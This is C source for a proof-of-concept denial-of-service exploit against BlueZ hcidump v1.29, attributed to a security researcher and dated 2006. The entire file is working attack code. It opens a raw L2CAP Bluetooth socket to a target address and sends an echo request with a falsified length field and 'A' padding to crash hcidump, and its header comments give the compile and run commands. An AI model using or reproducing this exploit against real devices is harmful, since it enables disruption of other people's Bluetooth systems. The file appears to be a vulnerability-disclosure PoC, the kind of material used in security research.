/*	Bluez hcidump v1.29 DoS - PoC code			*/
/* 	Pierre BETOUIN <pierre.betouin@security-labs.org>	*/
/*	01/18/06						*/
/*	Crashes hcidump sending bad L2CAP packet		*/
/*								*/
/*	gcc -lbluetooth hcidump-crash.c -o hcidump-crash	*/
/*	./hcidump-crash 00:80:37:XX:XX:XX			*/
/*	L2CAP packet sent (15)					*/
/*	Buffer: 08 01 0C 00 41 41 41 41 41 41 41 41 41 41 41	*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <bluetooth/bluetooth.h>
#include <bluetooth/hci.h>
#include <bluetooth/l2cap.h>

#define SIZE		15
#define FAKE_SIZE	12

int main(int argc, char **argv)
{
	char *data;
	l2cap_cmd_hdr *cmd;	
	struct sockaddr_l2 destAddress;
	int sock, numBytesSent, i;

	if(argc < 2)
	{
		fprintf(stderr, "%s <btaddr>\n", argv[0]);
		exit(EXIT_FAILURE);
	}
	
	if ((sock = socket(PF_BLUETOOTH, SOCK_RAW, BTPROTO_L2CAP)) < 0) 
	{
		perror("socket");
		exit(EXIT_FAILURE);
	}

	memset(&destAddress, 0, sizeof(destAddress));
	destAddress.l2_family = AF_BLUETOOTH;

	if (bind(sock, (struct sockaddr *) &destAddress, sizeof(destAddress)) < 0) 
	{
		perror("bind");
		exit(EXIT_FAILURE);
	}

	str2ba(argv[1], &destAddress.l2_bdaddr);
	
	if (connect(sock, (struct sockaddr *) &destAddress, sizeof(destAddress)) < 0) 
	{
		perror("connect");
		exit(EXIT_FAILURE);
	}
	
	if(!(data = (char *) malloc ((int) SIZE + 1))) 
	{
		perror("malloc");
		exit(EXIT_FAILURE);
	}
	
	memset(data, 'A', SIZE);

	cmd = (l2cap_cmd_hdr *) data;
	cmd->code = L2CAP_ECHO_REQ;
	cmd->ident = 1;
	cmd->len = FAKE_SIZE;
	
	if( (numBytesSent=send(sock, data, SIZE, 0)) >= 0)
	{
		printf("L2CAP packet sent (%d)\n", numBytesSent);
	}

	printf("Data:\t");
	for(i=0; i<numBytesSent; i++)
		printf("%.2X ", (unsigned char) data[i]);
	printf("\n");

	free(data);
	close(sock);
	return EXIT_SUCCESS;
}
